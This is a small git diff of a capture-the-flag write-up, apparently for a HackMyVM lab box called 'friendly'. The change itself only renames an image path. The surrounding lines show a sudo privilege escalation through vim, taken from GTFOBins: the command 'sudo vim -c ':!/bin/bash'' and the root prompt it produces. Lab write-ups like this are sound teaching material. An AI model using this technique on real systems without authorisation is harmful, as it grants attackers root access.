@@ -160,7 +160,7 @@ Now, i'm PRETTY sure that `vim` is in GTFOBins so let's check that out
 there indeed is!   
 ![test](/assets/img/hmv/friendly/vim.png)  
 Abusing vim:  
-![test](/assets/img/hmv/friendly/test.png)  
+![test](/assets/img/hmv/friendly/rce.png)  
 ```
 www-data@friendly:/var/www$ sudo vim -c ':!/bin/bash'
 root@friendly:/var/www# 
